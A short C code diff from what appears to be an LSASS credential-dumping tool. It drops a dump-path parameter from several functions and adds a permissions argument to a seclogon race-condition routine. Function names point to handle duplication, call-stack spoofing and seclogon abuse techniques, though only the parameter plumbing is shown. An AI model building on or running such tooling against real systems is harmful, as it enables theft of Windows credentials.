@@ -356,7 +356,6 @@ BOOL obtain_lsass_handle(
         use_seclogon_duplicate,
         spoof_callstack,
         is_seclogon_leak_local_stage_2,
-        dump_path,
         attributes);
     if (!hProcess)
         goto cleanup;
@@ -431,7 +430,6 @@ HANDLE open_handle_to_lsass(
     IN BOOL seclogon_race,
     IN DWORD spoof_callstack,
     IN BOOL is_malseclogon_stage_2,
-    IN LPCSTR dump_path,
     IN DWORD attributes)
 {
     HANDLE hProcess = NULL;
@@ -440,8 +438,7 @@ HANDLE open_handle_to_lsass(
     {
         // this is always done from an EXE
 #ifdef EXE
-        hProcess = malseclogon_stage_2(
-            dump_path);
+        hProcess = malseclogon_stage_2();
 #endif
     }
     // duplicate an existing handle to LSASS
@@ -457,6 +454,7 @@ HANDLE open_handle_to_lsass(
     {
         hProcess = malseclogon_race_condition(
             lsass_pid,
+            permissions,
             attributes);
     }
     else if (spoof_callstack)
